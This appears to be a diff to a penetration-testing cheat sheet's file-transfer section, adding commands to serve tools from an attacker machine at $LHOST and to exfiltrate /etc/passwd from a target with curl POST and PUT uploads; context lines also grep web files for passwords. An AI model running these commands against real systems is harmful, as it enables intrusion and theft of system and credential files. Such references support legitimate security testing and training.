@@ -31,10 +31,28 @@ grep -r "password" /var/www/html/ 2>/dev/null
 Stand up a quick HTTP server on the attacker machine and pull files down with wget or curl: works in almost every environment.
 
 ```bash wrap
+# Attacker
 python3 -m http.server 8080
-wget http://<IP>:8080/file
-curl http://<IP>:8080/file -o file
+
+# Target
+wget http://$LHOST:8080/file
+curl http://$LHOST:8080/file -o file
 ```
+
+To send files back to the attacker, use `uploadserver` which adds PUT/POST upload support to the standard Python server.
+
+```bash wrap
+# Attacker
+pip3 install uploadserver
+python3 -m uploadserver 8080
+
+# Target: POST a file
+curl -F "files=@/etc/passwd" http://$LHOST:8080/upload
+
+# Target: PUT a file
+curl -T /etc/passwd http://$LHOST:8080/
+```
+
 
 ## Shell Upgrade
 
